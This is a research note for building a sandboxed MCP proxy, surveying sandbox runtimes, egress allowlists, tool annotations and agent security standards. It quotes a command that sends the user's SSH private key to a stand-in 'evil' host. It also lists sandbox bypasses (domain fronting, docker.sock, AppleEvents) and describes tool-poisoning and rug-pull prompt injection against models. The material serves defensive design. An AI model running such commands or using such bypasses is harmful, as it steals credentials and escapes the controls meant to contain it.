# 04 — Industry Research

Conducted 2026-08-27. Goal — understand what already exists, what standards have
formed, and what this changes in our plan.

## TL;DR — five things that changed the plan

1. **Our shim→daemon architecture is described in the MCP spec as a distinct attack vector.**
2. **`anthropic-experimental/sandbox-runtime` covers almost all of E3** — we don't write our own SBPL.
3. **Network — domain allowlist through a proxy**, not a binary `deny`.
4. **We don't invent risk tiers** — the MCP spec already has ready-made tool annotations.
5. **Our idea has already been implemented at least twice** — the novelty needs to be reframed.

---

## 1. The MCP spec describes an attack on our architecture

The [Security Best Practices](https://modelcontextprotocol.io/specification/draft/basic/security_best_practices)
document contains a section called **"stdio Transport Security in Proxy Scenarios,"** literally about a proxy
that spawns MCP servers as child processes:

> 1. Attacker achieves XSS or other code execution on the client side
> 2. Obtains the MCP proxy's authentication token from the client environment
> 3. Makes authenticated requests to the local proxy
> 4. Proxy spawns arbitrary commands via stdio, treating them as legitimate servers
> 5. RCE with the user's privileges

Spec recommendations we adopt: sandboxing spawned processes, filesystem restrictions,
logging all stdio traffic, separate authorization for dangerous commands, isolating
communication with the proxy in a dedicated security context.

**Our hardening beyond the spec:** the daemon accepts only `{recipe, params}`, never argv.
Full control over the socket at most allows invoking an existing recipe — not RCE.

The same document has a section **"Local MCP Server Compromise"** with an example of
exactly our scenario:

```bash
npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location
```

and a MUST requirement to show the exact command without truncation before execution.

## 2. `@anthropic-ai/sandbox-runtime` (srt)

[github.com/anthropic-experimental/sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime).
What Claude Code's native sandbox runs on. Research preview, open source.

### What's already there

- Generates seatbelt profiles from JSON (macOS), bubblewrap (Linux), WFP + a dedicated
  `srt-sandbox` user (Windows, alpha)
- **HTTP + SOCKS5 proxy on the host** for domain filtering — something not in our plan
- Asymmetric permission model: reads are deny-then-allow, writes are allow-only
- **Mandatory deny paths**, unremovable even with an explicit allow: `.bashrc`, `.zshrc`, `.profile`,
  `.gitconfig`, `.git/hooks/`, `.vscode/`, `.idea/`, `.claude/commands/`
- **`sandbox-violation-store`** — reads the macOS system sandbox violation log
  and exposes it programmatically
- `srt-proxy-agent.jar` Java agent, because the JVM ignores env-based proxy settings

### API

```ts
import { SandboxManager, type SandboxRuntimeConfig } from '@anthropic-ai/sandbox-runtime'

await SandboxManager.initialize(config)
const wrapped = await SandboxManager.wrapWithSandbox('pnpm test')
const violations = SandboxManager.getViolationsForCommand(commandId)
const annotated  = SandboxManager.annotateStderrWithSandboxFailures(commandId, stderr)
```

### Config format

```json
{
  "network": {
    "allowedDomains": ["registry.npmjs.org", "*.github.com"],
    "deniedDomains": [],
    "allowUnixSockets": []
  },
  "filesystem": {
    "denyRead":  ["~/.ssh", "~/.aws"],
    "allowRead": ["."],
    "allowWrite": ["coverage", "node_modules/.cache", "/tmp"],
    "denyWrite": [".env", "secrets/"]
  },
  "ignoreViolations": { "*": ["/usr/bin", "/System"] }
}
```

macOS supports git-style globs (`*`, `**`, `?`, `[abc]`); Linux — only literal paths.

### Why this is a gift for our UI

`getViolationsForCommand` gives a **structured stream of "what the process tried to do
and was denied."** This is ready-made content for the Electron timeline — no need to invent
a format, it already exists. Live monitoring:

```bash
log stream --predicate 'process == "sandbox-exec"' --style syslog
```

### Declared limitations

Worth knowing and being honest about them in the demo:

- filtering is **domain-only**, content is not inspected → domain fronting bypasses it
- a broad allowlist defeats the purpose: allow `github.com` → you can push data to your own repo
- `allowUnixSockets: ["/var/run/docker.sock"]` = full access to the host
- `enableWeakerNetworkIsolation` (needed for Go TLS) opens exfiltration via `trustd`
- `allowAppleEvents` "removes code-execution isolation" — apps launched through `open`/`osascript`
  run outside the sandbox
- writing to a permitted directory a file that later gets executed is a bypass
- on Linux, bubblewrap can only block **existing** files

**Effect on the plan:** E3 turns from "write and debug SBPL profiles" into
"map the manifest into an srt config + forward violations to the event bus." Roughly three times cheaper.

## 3. Network: domain allowlist, not a binary deny

Originally `network: none` was planned. Wrong: half of legitimate tasks need network access
(`npm ci` hits the registry), and a hard deny generates a mountain of false blocks — and that's
a metric we'll be judged on.

[ToolHive (Stacklok)](https://github.com/stacklok/toolhive) sets up an egress proxy + container
DNS + ingress proxy around an MCP server; traffic is only allowed to hosts from the permission
profile. srt does the same thing as a host-side proxy. The industry has converged on one pattern.

**Bonus:** the proxy sees every connection attempt, including blocked ones. In the UI
we don't show "network denied," we show "process reached out to `evil.io:443`, denied, 1.2 KB."

## 4. Tool annotations — a ready-made risk vocabulary

The [MCP blog](https://blog.modelcontextprotocol.io/posts/2026-03-16-tool-annotations)
explicitly calls them "risk vocabulary for agentic systems."

| Annotation | Meaning | Default |
|---|---|---|
| `readOnlyHint` | doesn't change the environment | `false` |
| `destructiveHint` | can delete/overwrite (only meaningful when `readOnlyHint: false`) | **`true`** |
| `idempotentHint` | repeating with the same args is harmless | `false` |
| `openWorldHint` | reaches into the external world | `true` |

**Defaults are pessimistic.** A tool without annotations is considered destructive,
non-idempotent, and open to the external world. This fits our model perfectly:
a recipe without an explicit declaration automatically gets the maximum risk tier — fail-safe
by construction. We don't invent our own `risk: low|high`, we emit the standard annotations
in `tools/list` (compatible with any MCP client) and map them to tiers internally.

## 5. Elicitation — a built-in confirmation mechanism that can't be trusted

The 2025-06-18 spec introduced [elicitation](https://blogs.cisco.com/developer/whats-new-in-mcp-elicitation-structured-content-and-oauth-enhancements):
the server sends `elicitation/create` with a message and a JSON schema, the client shows it
to the user. Pinterest, per public writeups, routes all sensitive MCP operations through this.

**But for us this cannot be the authoritative path.** Elicitation goes through the client
and the model — meaning the confirmation lives in the same channel we consider
compromised. This is OWASP ASI09 in its purest form.

Dual-channel scheme: elicitation is the soft path for low/medium; the Electron modal is
out-of-band, the sole authoritative channel for high-risk. See [ADR-0005](adr/0005-dual-channel-approvals.md).

## 6. Rug pull — a CVE, not a hypothesis

[Invariant Labs](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks)
describe three classes that share a common structural cause — **MCP clients inherit trust
in servers without continuous verification**:

- **Tool poisoning / line jumping** — hidden instructions in a tool's description influence
  the client without the user's knowledge. First public PoC — April 2025. The terminology and
  classification belong to **Invariant Labs**, not the MCP spec: the spec doesn't contain them, and
  citing the spec as the source of these names is incorrect.
- **Rug pull** — the server changes a tool's description **after** the user approved it.
  Per public reports, **CVE-2025-54136** (CVSS 8.8) confirmed that approval of a tool
  definition does not survive a server-side change.
- **Tool shadowing** — a malicious server overrides the behavior of a trusted tool.

Academic measurements across 45+ real MCP servers: attack success rate > 60%,
72.8% for the best-performing model.

**Translated to us:** `mcpproxy.yaml` lives in the repository and can be changed by anyone —
including the model itself via another tool, or a contributor via a PR. You approved a recipe
yesterday — today it does something else. Which means a lock file is mandatory ([ADR-0006](adr/0006-manifest-lockfile.md)).

**Mirror-image nuance:** we ourselves generate tool descriptions from the manifest, so we're
immune to poisoning from someone else's server — but this means **the manifest becomes an
injection channel into our own model**. Sanitizing `description` when generating `tools/list`
is mandatory.

There's [`mcp-scan`](https://invariantlabs.ai/blog/introducing-mcp-scan) — a static
scanner for descriptions against injection patterns and cross-origin escalations, plus a proxy
mode with runtime guardrails (YAML, hierarchically scoped by client/server/tool).
We could run it against our own output: "we were checked by an independent scanner."

## 7. Event schema — adopt OpenTelemetry

[GenAI semantic conventions](https://greptime.com/blogs/2026-05-09-opentelemetry-genai-semantic-conventions):
a span tree `invoke_agent` → `chat` / `execute_tool`, the `gen_ai.operation.name` attribute
(`create_agent`, `invoke_agent`, `invoke_workflow`, `execute_tool`, `retrieval`, `plan`,
memory operations). `execute_tool` — always span kind INTERNAL.

**The direction of the migration was recorded incorrectly and corrected by the 2026-08-27
research.** The `model/mcp/registry.yaml` registry was checked against every tag of the main
conventions repository: it doesn't exist before v1.39.0, it's present in v1.39.0–v1.41.x, and
**absent starting with v1.42.0**. The v1.42.0 release notes say that all `gen_ai.*` and
`model/mcp/` **moved out** of the main repository into a separate
`open-telemetry/semantic-conventions-genai`. In other words, the MCP conventions didn't move
into the shared dictionary — they moved out of it.

**Which attributes don't exist.** The registry has only four MCP attributes: `mcp.method.name`,
`mcp.session.id`, `mcp.resource.uri`, `mcp.protocol.version`. The tool name reuses
`gen_ai.tool.name`, the request identifier is `jsonrpc.request.id`, the transport is
`network.transport`. The previously cited `mcp.tool.name`, `mcp.request.id`, and `mcp.transport`
don't exist at all.

Status as of mid-July 2026 — all `gen_ai.*` are marked "Development," not Stable.
The new repository has no tags and no releases at all, meaning you can only pin to a commit,
and drift has already been observed: `gen_ai.agent.name` appeared on the `execute_tool` span
after v1.41.0 without a release. This is the argument for **our own shape plus an exporter**,
rather than adopting the native schema directly.

**Payoff:** free export into any observability stack and the argument "plugs into an
existing pipeline." Cost is zero if built into E0; reworking it later is expensive.
See [ADR-0003](adr/0003-otel-event-schema.md).

## 8. Metrics and attack corpora — there's an established methodology

- **InjecAgent** — the first benchmark built specifically for indirect prompt injection in
  tool-integrated agents: 1054 cases, 17 user tools and 62 attacker tools.
- **AgentDojo** — 97 practical tasks, 629 security cases, a simulated environment
  with multi-step interaction and end-to-end evaluation.

The established pair of metrics:

- **ASR** (Attack Success Rate) — fraction of successful attacks
- **Utility under Attack** — ability to complete legitimate tasks while under attack

The second metric catches exactly the failure mode in our falsification criterion
("excessively blocks safe actions"). Both should always be shown together.

The corpora themselves don't fit us (email clients, banking) — we take the methodology and
terminology, and write our own CLI-specific corpus. See [09-metrics-and-eval.md](09-metrics-and-eval.md).

## 9. OWASP Top 10 for Agentic Applications 2026

Published December 9, 2025, categories ASI01–ASI10. Full table with our coverage —
in [03-threat-model.md](03-threat-model.md).

| ID | Risk | Primary OWASP mitigation |
|---|---|---|
| ASI01 | Agent Goal Hijack | Treat received content as untrusted; constrain goals |
| ASI02 | Tool Misuse & Exploitation | Least-agency scoping; parameter validation |
| ASI03 | Identity & Privilege Abuse | Per-agent identity; short-lived scoped credentials |
| ASI04 | Agentic Supply Chain | Signed components; AIBOM and provenance |
| ASI05 | Unexpected Code Execution | Sandboxing; deny-by-default egress |
| ASI06 | Memory & Context Poisoning | Validated writes to memory; ephemeral context |
| ASI07 | Insecure Inter-Agent Comms | Mutual authentication; signed messages |
| ASI08 | Cascading Failures | Blast-radius isolation; circuit breakers |
| ASI09 | Human-Agent Trust Exploitation | Mandatory confirmation of sensitive actions |
| ASI10 | Rogue Agents | Behavioral monitoring; kill switch |

## 10. Smaller items we're taking on board

- **Docker MCP Gateway** implements [interceptors](https://www.docker.com/blog/docker-mcp-gateway-secure-infrastructure-for-agentic-ai/):
  `--block-secrets` scans **inbound and outbound** payloads; `--verify-signatures`
  checks image provenance; `--log-calls`. Two-directional scanning is the right approach.
- **We don't write our own secret patterns.** gitleaks has 150+ rules (AWS, GitHub, Slack webhooks,
  DB connection strings, private keys) plus entropy analysis on top of regex.
  There's [Secrets-Patterns-DB](https://mazinahmed.net/blog/secrets-patterns-db/) in a
  unified format with conversion for gitleaks/trufflehog.
  TruffleHog computes Shannon entropy for base64 and hex sequences on blocks > 20 characters.
- **Audit:** hash-chain is sufficient; industry best practice is Merkle + consistency
  proofs in the Certificate Transparency style (a log of 80M events → a 3 KB proof).
- **Cedar** — AWS built it into Bedrock AgentCore Policy in March 2026 specifically to intercept
  agent-tool calls: default-deny, forbid-wins-over-permit, order-independent evaluation,
  formally verified semantics. Overkill for a solo demo; mentioning "the policy layer can be
  offloaded to Cedar" adds credibility.
- **Electron:** [`contextIsolation: true`, `sandbox: true`, `nodeIntegration: false`,
  `webSecurity: true`, a strict CSP](https://www.electronjs.org/docs/latest/tutorial/security).
  IPC is a security boundary — every message from the renderer must be validated as an untrusted
  HTTP request. Separately — the V8 patch gap: with `sandbox: true`, V8 exploits stay
  contained within the renderer.
- **CaMeL / dual-LLM** ([arXiv:2503.18813](https://arxiv.org/pdf/2503.18813)) —
  a theoretical framework: control flow is derived from a trusted request, untrusted
  data cannot influence it; every value carries capability metadata, and a custom
  interpreter tracks provenance. 67% of attacks deflected on AgentDojo.
  Our recipe = a capability in their terms.

## Sources

- [MCP Security Best Practices](https://modelcontextprotocol.io/specification/draft/basic/security_best_practices)
- [anthropic-experimental/sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime)
- [Tool Annotations as Risk Vocabulary — MCP Blog](https://blog.modelcontextprotocol.io/posts/2026-03-16-tool-annotations)
- [OWASP Top 10 for Agentic Applications 2026](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/) ·
  [Palo Alto writeup](https://www.paloaltonetworks.com/blog/cloud-security/owasp-agentic-ai-security/) ·
  [Cycode writeup](https://cycode.com/blog/owasp-top-10-agentic-applications/)
- [Invariant Labs — Tool Poisoning](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks) ·
  [MCP-Scan](https://invariantlabs.ai/blog/introducing-mcp-scan)
- [ToolHive](https://github.com/stacklok/toolhive) · [Network isolation](https://docs.stacklok.com/toolhive/guides-cli/network-isolation)
- [Docker MCP Gateway](https://www.docker.com/blog/docker-mcp-gateway-secure-infrastructure-for-agentic-ai/)
- [OTel GenAI semantic conventions](https://greptime.com/blogs/2026-05-09-opentelemetry-genai-semantic-conventions)
- [MCP Elicitation (Cisco)](https://blogs.cisco.com/developer/whats-new-in-mcp-elicitation-structured-content-and-oauth-enhancements)
- [AgentDojo / AgentDyn](https://arxiv.org/html/2602.03117v1)
- [Defeating Prompt Injections by Design (CaMeL)](https://arxiv.org/pdf/2503.18813)
- [tumf/mcp-shell-server](https://github.com/tumf/mcp-shell-server)
- [Electron Security](https://www.electronjs.org/docs/latest/tutorial/security)
- [Secrets Patterns DB](https://mazinahmed.net/blog/secrets-patterns-db/)
